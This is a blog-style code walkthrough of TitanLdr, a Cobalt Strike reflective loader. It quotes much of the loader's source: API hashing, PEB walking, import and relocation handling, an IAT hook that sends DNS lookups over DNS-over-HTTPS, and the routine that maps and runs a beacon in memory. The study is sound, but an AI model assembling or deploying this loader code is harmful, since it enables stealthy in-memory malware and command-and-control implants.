---
title: TitanLdr Overview
pubDate: 2025-03-12
---

Recently I was talking to my friend [0xLegacyy](https://x.com/0xLegacyy) about 
my little packer project I'm working on, and since I want to extract my 
position independent loader and append it to a PE (Portable Executable), he 
suggested I take a look at TitanLdr since it apparently demonstrates how we 
can extract PIC (Position Independent Code) from a PE. Additionally this would 
be a great opportunity to learn about more interesting techniques used in 
malware.

> **INFO:**
> This was originally just my notes, so it was not intended to be a blog post 
> but I figured, why not make it a blog post. Also I will be taking a look at 
> the TitanLdr repo that was forked by [kyleavery_](https://x.com/kyleavery_).

# Overview

First, what even is TitanLdr? Well according to the description of the 
[repo](https://github.com/kyleavery/TitanLdr/) it is a...

> Cobalt Strike User Defined Reflective Loader (UDRL). Check branches for 
> different functionality.

If we take a look at the branches of the repository we have two versions of 
the loader:

```txt
 o ----+----> master
       '----> heapencrypt
```

We are gonna only take a look at the `master` branch since otherwise this post 
would be too long (lie, I'm just lazy). If you are still interested in seeing 
what the `heapencrypt` branch has to offer, I encourage you to do so after this
post! Now without further ado, let's get started.

## Compilation
 
Allegedly, the loaders' code is later extracted and saved as a raw binary. 
For this reason, the best, and probably the most boring, place to start is 
the Makefile. Taking a look at it we can assume the binary is compiled under 
Linux and the project seems to support both x86 and x64. Since this is likely 
uninteresting stuff I will not go much into depth, however some good stuff to 
note is the following:

```txt
# These flags just make sure the bin is actually position independent
# and make sure the final binary is as small as possible
CFLAGS	:= $(CFLAGS) -Os -fno-asynchronous-unwind-tables -nostdlib 
CFLAGS 	:= $(CFLAGS) -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS	:= $(CFLAGS) -s -ffunction-sections -falign-jumps=1 -w
CFLAGS	:= $(CFLAGS) -falign-labels=1 -fPIC -Wl,-TSectionLink.ld
# Additionally, since there is a linker script used for the loader, these
# ensure everything is correctly linked
LFLAGS	:= $(LFLAGS) -Wl,-s,--no-seh,--enable-stdcall-fixup
```

Now except these compiler flags, the Makefile also assembles some ASM code, 
that we will get to later, and also calls a python script called `extract.py` 
which takes the compiled PE (using the `-f` flag) and the raw binary (using 
the `-o` flag) as flags.

### Taking a Closer Look at `extract.py`

In general the script is pretty simple, it takes as input our compiled binary, 
extracts the data from the first section it finds and slices the data at the 
point where the string 'ENDOFCODE' appears. The sliced list is then written to 
a file specified by our `-o` flag.

```python
### CUT ###
PeExe = pefile.PE( option.f );
PeSec = PeExe.sections[0].get_data();

if PeSec.find( b'ENDOFCODE' ) != None:
     ScRaw = PeSec[ : PeSec.find( b'ENDOFCODE' ) ];
     f = open( option.o, 'wb+' );
     f.write( ScRaw );
     f.close();
### CUT ###
```

### A Quick Peek at the Linker Script

At first sight, the linker script seems quite unclear, however we will reference 
it later as we read the source code. For now all we can pull from the script is
that it creates a `.text` section which consists of another 6 `.text$?` segments, 
where the `?` is a letter from A to F. Another thing to note is that the section 
also has a `.rdata*` segment sandwiched between `.text$E` and `.text$F`. Cool.

```txt
SECTIONS
{
	.text :
	{
		*( .text$A )
		*( .text$B )
		*( .text$C )
		*( .text$D )
		*( .text$E )
		*( .rdata* )
		*( .text$F )
	}
}
```

# Entering the Depths

Now that we have most of the boring stuff out of the way we can begin looking 
at the source code. Since I am a big nerd, I wanted to look into the `asm/` 
directory to see what is going on there. In it, we are greeted by two more 
directories: `x64` and `x86`. These have mostly the same code  with the 
exception of the `Start.asm` file where the 64-bit version also aligns the 
stack and allocates some memory on the stack.

The `Start.asm` code is pretty simple, it imports the function `Titan` and 
exports the `Start` label. Then we finally start the function by setting up the
stack and calling this interesting looking function called `Titan`. After that, 
the stack is cleaned up and we exit out.

```asm
[BITS 64]

EXTERN Titan
GLOBAL Start

[SECTION .text$A]

Start:
	; Setup stack
	push	rsi
	mov	    rsi, rsp
	and	    rsp, 0FFFFFFFFFFFFFFF0h
	; Execute Loader
	sub	    rsp, 020h
	call	Titan
	
	; Clean Up and Exit
	mov	    rsp, rsi
	pop	    rsi
	ret
```

Additionally, we can see `[SECTION .text$A]`, which marks the section that 
the code should be placed in. We now konw something more about the linker script:

```txt
*( .text$A ) // Start of Code
*( .text$B )
*( .text$C )
*( .text$D )
*( .text$E )
*( .rdata* )
*( .text$F )
```

Awesome! This made me curious what the imported `Titan` function does, so let's 
dive into it now!

## The Titans Nest

After a little bit of searching we finally find the function called 
`Titan` in the `Main.c` file at the root of the projects directory. Now we 
*could* just read this straight up, however, the code is littered with 
preprocessor macros and other functions. This makes it easier for the developer 
to work on the code, but also makes it much harder for us to see what the code 
is doing behind the scenes. So, sorry kids we are jumping into the one and only 
import in the file, `Common.h`. Once we open that we are greeted 
with this:

```cpp
/* Include core defs */
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <ntstatus.h>
#include "Native.h"    // 20.000+ lines of NT definitions T-T
#include "Macros.h"

/* Include Library */
#include "Labels.h" // Imports the asm code ( Start, GetIp, Hooks )
#include "Hash.h"
#include "Peb.h"
#include "Ldr.h"
#include "Pe.h"

/* Include Hooks! */
#include "hooks/DnsQuery_A.h"
```

Just some includes, however they contain the core functionality of the loader, 
so let's start with `Macros.h`, (Trust me, I wasted a lot of time going 
through `Native.h`, nothing interesting there :)). So `Macros.h` only contains,
as the name says, some macro definitions, however these clear up A LOT of things:

```cpp
/* Gets a pointer to the function or string via its relative offset to GetIp() */
#define G_SYM( x )	(ULONG_PTR)(GetIp() - ((ULONG_PTR)&GetIp - (ULONG_PTR)x))

/* Sets a function in a specific region of memory */
#define D_SEC( x )	__attribute__(( section( ".text$" #x ) ))

/* Cast as a pointer with the specified typedef */
#define D_API( x )	__typeof__( x ) * x

/* Cast as a unsigned pointer-wide integer type */
#define U_PTR( x )	( ( ULONG_PTR ) x )

/* Cast as a unsigned pointer-wide type */
#define C_PTR( x )	( ( PVOID ) x )

/* Arch Specific Macros */
#if defined( _WIN64 )
	/* Get the end of code: x64 */
	#define G_END( x )	U_PTR( GetIp( ) + 11 )
#else
	/* Get the end of code: x86 */
	#define G_END( x )	U_PTR( GetIp( ) + 10 )
#endif
```

Now, this is very likely a skill issue of mine, but the comments aren't really 
that useful here, so allow me to explain a little:

`G_SYM( x )` Gets an address via its relative offset. It does so by calling 
`GetIp` (defined in the `GetIp.asm` file), which fetches the current 
Instruction Pointer using a `call`/`pop` trick. Since `GetIp` is placed at a 
fixed location (`.text$F`), the shellcode can calculate addresses relative 
to it.

```asm
[BITS 64]

; Export
GLOBAL GetIp
GLOBAL Hooks

[SECTION .text$C]

Hooks:
	; Arbitrary symbol to reference as start of hook pages
	nop

[SECTION .text$F]

GetIp:
	; Execute next instruction
	call	get_ret_ptr

get_ret_ptr:
	; Pop address and sub diff
	pop	    rax
	sub	    rax, 5
	ret

Leave:
	db 'E', 'N', 'D', 'O', 'F', 'C', 'O', 'D', 'E'
```

This knowledge also allows us to expand our little comments on the linker 
script:

```txt
*( .text$A ) // Start of Code
*( .text$B )
*( .text$C ) // Hooks
*( .text$D )
*( .text$E )
*( .rdata* )
*( .text$F ) // GetIp & End of Code
```

Anyways, back to the macros, most are pretty self explanitory so here are
the ones that need a little bit more explaination:

`D_SEC( x )` Places some function into a specific region we set in the linker 
script. Very useful to know for later!

`G_END( x )` Gets the end of the code, marked with "ENDOFCODE". It works by 
getting the address of `GetIp` and adding 10 or 11 (depending if the system is 
32-bit or 64-bit; because of [REX prefixes](https://stackoverflow.com/questions/68604377/what-is-rex-prefix-in-instruction-encoding)) to it.

### API Hashing

Next up, we got `Hash.h`, this declares the function `HashString` which takes a
buffer and its length and returns a DJB hash of it. And finally, the function 
is placed at the segment `E`. It is defined as follows:

```cpp
#include "Common.h"

D_SEC( E ) UINT32 HashString( _In_ PVOID Buffer, _In_opt_ ULONG Length ) 
{
	UCHAR	Cur = 0;
	ULONG	Djb = 0;
	PUCHAR	Ptr = NULL;
	Djb = 5381;
	Ptr = C_PTR( Buffer );
	
	while (TRUE) {
		/* Get the current character */
		Cur = *Ptr;
		if (!Length) {
			/* NULL terminated? */
			if (!*Ptr) {
				break;
			};
		}
		/*---- CUT ----*/
		/* Lowercase */
		if (Cur >= 'a') {
			Cur -= 0x20;
		};
		/* Hash the character */
		Djb = ((Djb << 5) + Djb) + Cur; ++Ptr;
	};
	return Djb;
};
```

The next import is `Peb.h`, this consists of a function called `PebGetModule` 
which takes an hash as an argument, and places it in `.text$E`. It works by 
calling the function `NtCurrentPeb` from `hooks/DnsQuery_A.c` that gets the 
current PEB of the module, then it goes over the `InLoadOrderModuleList`, 
comparing the hash we passed in as the argument with the hash of the current 
module in memory.

```cpp
#include "Common.h"

D_SEC( E ) PVOID PebGetModule( _In_ ULONG Hash )
{
	PPEB			Peb = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;
	/* Get pointer to list */
	Peb = NtCurrentPeb();
	Hdr = & Peb->Ldr->InLoadOrderModuleList;
	Ent = Hdr->Flink;
	
	for (;Hdr != Ent; Ent = Ent->Flink) {
		Ldr = C_PTR( Ent );
		/* Compare the DLL Name! */
		if (HashString(Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length) == Hash) {
			return Ldr->DllBase;
		};
	};
	return NULL;
};
```

### PE Utilities

The `Pe.h` consists of only one function called `PeGetFuncEat` which takes the 
base address of the DLL and the Hash of the function it wants to load as 
arguments. It first gets the NT-Header and then uses it to access the 
`IMAGE_DIRECTORY_ENTRY_EXPORT` from the data directory. Then it first checks if
the image even has imports by checking if the first entries virtual address is 
not null. If it isn't null, it saves the pointer in the variable `Exp` of type 
`PIMAGE_EXPORT_DIRECTORY`. 

`Exp` is then used to get the address of the function names, the functions 
address and its ordinal value. Then it iterates trough all the entries hashing 
each function name and checking if it matches the hash passed in as the 
argument. If it matches, it returns the functions' address, and if not, it will 
return NULL. Here is how it looks like in the repo:

```cpp
D_SEC( E ) PVOID PeGetFuncEat( _In_ PVOID Image, _In_ ULONG Hash ) 
{
	ULONG			Idx = 0;
	PUINT16			Aoo = NULL;
	PUINT32			Aof = NULL;
	PUINT32			Aon = NULL;
	PIMAGE_DOS_HEADER	Hdr = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;
	
	Hdr = C_PTR( Image );
	Nth = C_PTR( U_PTR( Hdr ) + Hdr->e_lfanew );
	Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
	
	/* Has a EAT? */
	if ( Dir->VirtualAddress ) {
		Exp = C_PTR( U_PTR( Hdr ) + Dir->VirtualAddress );
		Aon = C_PTR( U_PTR( Hdr ) + Exp->AddressOfNames );
		Aof = C_PTR( U_PTR( Hdr ) + Exp->AddressOfFunctions );
		Aoo = C_PTR( U_PTR( Hdr ) + Exp->AddressOfNameOrdinals );
		
		/* Enumerate exports */
		for ( Idx = 0 ; Idx < Exp->NumberOfNames ; ++Idx ) {
			/* Create a hash of the string and compare */
			if ( HashString( C_PTR( U_PTR( Hdr ) + Aon[ Idx ] ), 0 ) == Hash ) {
				return C_PTR( U_PTR( Hdr ) + Aof[ Aoo[ Idx ] ] );
			};
		};
	};
	return NULL;
};
```
### Resolving Imports

Now this is a topic that I personally struggled with a lot, but while reading 
TitanLdr, it suddenly all clicked! Anyhow, first we have the `LdrProcessIat`, 
the needed API for the loading process are resolved using `PeGetFuncEat` and 
the API that are used are:

- `RtlAnsiStringToUnicodeString`
- `LdrGetProcedureAddress`
- `RtlFreeUnicodeString`
- `RtlInitAnsiString`
- `LdrLoadDll`

Following that we got the import resolving logic. It first jumps into a for 
loop; the loop goes over every import and then initializes an ANSI string that
should contain the DLL name from the address of:

```c
strDllName = pbImageBase + ImportDesc->Name
```

Next, the string is converted to Unicode and the DLL is loaded using 
`LdrLoadDll`. Now comes the commonly confusing part of Import Resolving. First 
we enter yet another for loop, in this one we iterate through every 
`u1.AddressOfData` till its not NULL and increment `OriginalFirstThunk` and 
`FirstThunk` for every cycle. In it we check if the function is imported by 
ordinal or by name, then using `LdrGetProcedureAddress` the address of the 
function is resolved and saved in `FirstThunk->u1.Function`. That's it.
Aaand here is the definition:

```cpp
D_SEC( E ) VOID LdrProcessIat( _In_ PVOID Image, _In_ PVOID Directory )
{
	API			Api;
	ANSI_STRING		Ani;
	UNICODE_STRING		Unm;
	PVOID				Mod = NULL;
	PVOID				Fcn = NULL;
	PIMAGE_THUNK_DATA		Otd = NULL;
	PIMAGE_THUNK_DATA		Ntd = NULL;
	PIMAGE_IMPORT_BY_NAME		Ibn = NULL;
	PIMAGE_IMPORT_DESCRIPTOR	Imp = NULL;
	
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Unm, sizeof( Unm ) );

	Api.RtlAnsiStringToUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLANSISTRINGTOUNICODESTRING );
	Api.LdrGetProcedureAddress       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.RtlFreeUnicodeString         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEUNICODESTRING );
	Api.RtlInitAnsiString            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.LdrLoadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Enumerate the directory. */
	for ( Imp = C_PTR( Directory ) ; Imp->Name != 0 ; ++Imp ) {
		Api.RtlInitAnsiString( &Ani, C_PTR( U_PTR( Image ) + Imp->Name ) );
		
		if ( NT_SUCCESS( Api.RtlAnsiStringToUnicodeString( &Unm, &Ani, TRUE ) ) ) {
			if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Unm, &Mod ) ) ) {
				Otd = C_PTR( U_PTR( Image ) + Imp->OriginalFirstThunk );
				Ntd = C_PTR( U_PTR( Image ) + Imp->FirstThunk );
				
				/* Enumerate Function Imports */
				for ( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd ) {
					if ( IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) ) {
						/* Is Integer? Import */
						if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, NULL, IMAGE_ORDINAL( Otd->u1.Ordinal ), &Fcn ) ) ) {
							Ntd->u1.Function = Fcn;
						};
					} else {
						/* Is String? Import */
						Ibn = C_PTR( U_PTR( Image ) + Otd->u1.AddressOfData );
						Api.RtlInitAnsiString( &Ani, C_PTR( Ibn->Name ) );
						
						if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Mod, &Ani, 0, &Fcn ) ) ) {
							Ntd->u1.Function = Fcn;
						};
					};
				};
			};
			Api.RtlFreeUnicodeString( &Unm );
		};
	};
};
```

### Performing Relocations

On to the relocations processing, for it we have the function `LdrProcessRel`,
as the name says, it performs relocations on the loaded image. The parameters 
it takes are:

- A pointer to the Image
- The Directory we need to access (`IMAGE_DIRECTORY_ENTRY_BASERELOC`)
- The Images Base Address in memory

Jumping into the function, first things first, the offset is calculated using
the following formula:

> $$\text{DeltaOffset = Image - OptHdr}\rightarrow\text{ImageBase}$$

Then it jumps into a while loop, it loops till we have an invalid VA (Virtual 
Address). In it, it casts the next `ImageBaseRelocation` to `PIMAGE_RELOC` 
which is a bit-field that consists of `Offset` and `Type`. Next there is a 
jump into yet another while loop that loops till the `PIMAGE_RELOC` is not equal to 
`ImageBaseRelocation->SizeOfBlock`. Inside of the loop there is a switch-case
on the relocation type, if the type is `IMAGE_REL_BASED_DIR64` the relocation 
is performed like this:

```cpp
/* 8 wide */
case IMAGE_REL_BASED_DIR64:
	*(DWORD64*)(U_PTR(Image) + Ibr->VirtualAddress + Rel->Offset) += (DWORD64)(Delta);
	break;
```
Otherwise it does this:

```cpp
/* 4 wide */
case IMAGE_REL_BASED_HIGHLOW:
	*(DWORD32*)(U_PTR(Image) + Ibr->VirtualAddress + Rel->Offset) += (DWORD32)(Delta);
	break;
```

After that the `PIMAGE_RELOC` is incremented and we set `ImageBaseRelocation` 
to `PIMAGE_RELOC` which is our next Relocation we need to perform. In the repository, 
it looks like the following:

```cpp
D_SEC( E ) VOID LdrProcessRel( _In_ PVOID Image, _In_ PVOID Directory, _In_ PVOID ImageBase )
{
	ULONG_PTR		Ofs = 0;
	PIMAGE_RELOC		Rel = NULL;
	PIMAGE_BASE_RELOCATION	Ibr = NULL;
	
	Ibr = C_PTR( Directory );
	Ofs = C_PTR( U_PTR( Image ) - U_PTR( ImageBase ) );
	
	/* Is a relocation! */
	while ( Ibr->VirtualAddress != 0 ) {
		Rel = ( PIMAGE_RELOC )( Ibr + 1 );
		
		/* Exceed the size of the relocation? */
		while ( C_PTR( Rel ) != C_PTR( U_PTR( Ibr ) + Ibr->SizeOfBlock ) ) {
			switch( Rel->Type ) {
				/* 8 wide */
				case IMAGE_REL_BASED_DIR64:
					*( DWORD64 * )( U_PTR( Image ) + Ibr->VirtualAddress + Rel->Offset ) += ( DWORD64 )( Ofs );
					break;
				/* 4 wide */
				case IMAGE_REL_BASED_HIGHLOW:
					*( DWORD32 * )( U_PTR( Image ) + Ibr->VirtualAddress + Rel->Offset ) += ( DWORD32 )( Ofs );
					break;
			};
			++Rel;
		};
		Ibr = C_PTR( Rel );
	};
};
```

### Hooking

Finally, wrapping up the `Ldr.h` we have the function called `LdrHookImport`. 
This one is quite similar to the Import processing, however the only thing that
differs is that, once we find the function we need, we set the 
`FirstThunk->u1.Function` to a function address we passed in as an argument. 
Here is how it looks:

```cpp
D_SEC( E ) VOID LdrHookImport( _In_ PVOID Image, _In_ PVOID Directory, _In_ ULONG Hash, _In_ PVOID Function ) 
{
	ULONG				Djb = 0;
	PIMAGE_THUNK_DATA		Otd = NULL;
	PIMAGE_THUNK_DATA		Ntd = NULL;
	PIMAGE_IMPORT_BY_NAME		Ibn = NULL;
	PIMAGE_IMPORT_DESCRIPTOR	Imp = NULL;
	
	for ( Imp = C_PTR( Directory ) ; Imp->Name != 0 ; ++Imp ) {
		Otd = C_PTR( U_PTR( Image ) + Imp->OriginalFirstThunk );
		Ntd = C_PTR( U_PTR( Image ) + Imp->FirstThunk );
		for ( ; Otd->u1.AddressOfData != 0 ; ++Otd, ++Ntd ) {
			if ( ! IMAGE_SNAP_BY_ORDINAL( Otd->u1.Ordinal ) ) {
				Ibn = C_PTR( U_PTR( Image ) + Otd->u1.AddressOfData );
				Djb = HashString( Ibn->Name, 0 );
				if ( Djb == Hash ) {
					Ntd->u1.Function = C_PTR( Function );
				};
			};
		};
	};
};
```

#### Implementation of `DnsQuery_A` hook

Now the only function that is hooked is called `DnsQuery_A`, and its hook
does the following:

First `wininet.dll` and `dnsapi.dll` are loaded into memory. After that, the 
APIs needed from the `wininet.dll` are loaded and the code starts doing its thing.
First it calls `InternetOpenA` with the `INTERNET_OPEN_TYPE_DIRECT` flag to
initialize the use of the internet in the loader, next, an array of six DNS domains 
is created.

- dns.google
- dns.quad9.net
- mozilla.cloudflare-dns.com
- cloudflare-dns.com
- doh.opendns.com
- ordns.he.net

It then attempts to connect to a random DNS server from the array, and creates 
a POST request to the `/dns-query` endpoint. Next a DNS query message is created 
and stored in `Buf`, after that an HTTP-Request is sent with the content type of 
`application/dns-message`. Finally the HTTP header info is queried, and if successful 
it checks the status for 200 and if it received some data with the response. 

Once that is out of the way the File it received is read and it extracts the 
records from the message. Heres the code:

```cpp
/*--- CUT ---*/
Iop = Api.InternetOpenA( NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );

// https://github.com/curl/curl/wiki/DNS-over-HTTPS
ULONG_PTR domains[] = {
	G_SYM( "dns.google" ),
	G_SYM( "dns.quad9.net" ),
	G_SYM( "mozilla.cloudflare-dns.com" ),
	G_SYM( "cloudflare-dns.com" ),
	G_SYM( "doh.opendns.com" ),
	G_SYM( "ordns.he.net" )
};

if ( Iop != NULL ) {
	Icp = Api.InternetConnectA( 
		Iop,
		C_PTR( domains[ Api.RtlRandomEx( &seed ) % ARRAYSIZE( domains ) ] ),
		INTERNET_DEFAULT_HTTPS_PORT,
		NULL,
		NULL,
		INTERNET_SERVICE_HTTP,
		0,
		0 
	);

	if ( Icp == NULL ) {
		goto Leave;
	};

	Hop = Api.HttpOpenRequestA( 
		Icp,
		C_PTR( G_SYM( "POST" ) ),
		C_PTR( G_SYM( "/dns-query" ) ),
		NULL,
		NULL,
		NULL,
		INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI,
		0 
	);

	if ( Hop != NULL ) 
	{
		if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) ) {
			goto Leave;
		};
		if ( ! ( Buf = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Len ) ) ) {
			goto Leave;
		};
		if ( Api.DnsWriteQuestionToBuffer_UTF8( Buf, &Len, pszName, wType, 0, TRUE ) ) 
		{
			if ( Api.HttpSendRequestA( Hop, C_PTR( G_SYM( "Content-Type: application/dns-message" ) ), -1L, Buf, Len ) ) 
			{
				if ( Api.HttpQueryInfoA( Hop, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &Cod, &( DWORD ){ sizeof( DWORD ) }, NULL ) ) 
				{
					if ( Cod != HTTP_STATUS_OK ) {
						goto Leave;
					};
					if ( ! Api.InternetQueryDataAvailable( Hop, &Len, 0, 0 ) ) {
						goto Leave;
					};
					if ( ! ( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Len ) ) ) {
						goto Leave;
					};
					if ( Api.InternetReadFile( Hop, Res, Len, &( DWORD ){ 0 } ) ) 
					{
						DNS_BYTE_FLIP_HEADER_COUNTS( Res );
						Err = Api.DnsExtractRecordsFromMessage_UTF8( Res, Len, ppQueryResults );
					} else {
						goto Leave;
					};
/*--- CUT ---*/
```
## Finally, the `main`

The main function starts of by getting the address of `NtAllocateVirtualMemory` 
and `NtProtectVirtualMemory`. Since the payload is located after "ENDOFCODE" in 
the last segment, it sets the DOS header to point to that place and then proceeds 
to get the NT-Header. 

```c
Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );

/* Setup Image Headers */
Dos = C_PTR( G_END() );
Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
```

After that the size of the hooked function logic and the beacon is allocated 
by also making sure the image and hooks are aligned on a 4KB page boundary. 
Next the two values are summed up and ready to be used later:

```c
/* Allocate Length For Hooks & Beacon */
ILn = ( ( ( Nth->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
SLn = ( ( ( G_END() - G_SYM( Hooks ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
MLn = ILn + SLn;
```

Next, `MLn` bytes are allocated with the permissions `PAGE_READWRITE`. 
Once that is successful, it copies the hooked function over and then gets a 
pointer to the PE Image by adding the size of the hooked function to the new 
address of our allocated memory.

```c
if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &MLn, MEM_COMMIT, PAGE_READWRITE ) ) ) {
	/* Copy hooks over the top */
	__builtin_memcpy( Mem, C_PTR( G_SYM( Hooks ) ), U_PTR( G_END() - G_SYM( Hooks ) ) );
	/* Get pointer to PE Image */
	Map = C_PTR( U_PTR( Mem ) + SLn );
```

After that, pretty standard stuff happens, the sections are copied over to the 
allocated buffer and then a pointer to the import table is resolved. Once that 
is out of the way the IAT is resolved and the hooks are set.

```c
/* Copy sections over to new mem */
Sec = IMAGE_FIRST_SECTION( Nth );
for ( Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
	__builtin_memcpy( C_PTR( U_PTR( Map ) + Sec[ Idx ].VirtualAddress ),
					  C_PTR( U_PTR( Dos ) + Sec[ Idx ].PointerToRawData ),
					  Sec[ Idx ].SizeOfRawData );
};

/* Get a pointer to the import table */
Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

if ( Dir->VirtualAddress ) {
	/* Process Import Table */
	LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
	LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
};
```

Finally the Relocations are processed and the PE section size is increased by 
`SizeOfRawData`. Now after all of that, all that is to be done is to set the 
permissions of the mapped executable to `PAGE_EXECUTE_READ` and execute the 
entry point of the executable.

```c
/* Get a pointer to the relocation table */
Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

if ( Dir->VirtualAddress ) {
	/* Process Relocations */
	LdrProcessRel( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), Nth->OptionalHeader.ImageBase );
};

/* Extend to size of PE Section */
SLn = SLn + Sec->SizeOfRawData;

/* Change Memory Protection */
if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
	/* Execute EntryPoint */
	Ent = C_PTR( U_PTR( Map ) + Nth->OptionalHeader.AddressOfEntryPoint );
	Ent( G_SYM( Start ), 1, NULL );
	Ent( G_SYM( Start ), 4, NULL );
};
```
# Conclusion

Aaand we are done. Having read the full source code, the linker script is finally 
demystified!

```txt
*( .text$A ) // Start of Code
*( .text$B ) // Main Function
*( .text$C ) // Hooks
*( .text$D ) // Hook DNS Query
*( .text$E ) // GetModHandle, IAT, Relocs, HookImports
*( .rdata* )
*( .text$F ) // GetIp & End of Code
```

I hope you enjoyed this little journey into the source code of TitanLdr and 
maybe learned something new! I encourage you, the reader, to go play around 
with this code now or even read more source code of such amazing projects 
since one can learn a ton just by reading source code! :D

That's it for this time folks, have a good one!

# Greetz

This little section is just greetz to my friends that helped me to create this post!

- [Polprog](https://x.com/polprogpl) <- grammar police :)
- [0xLegacyy](https://x.com/0xLegacyy)
- [Bakki](https://x.com/avx128)
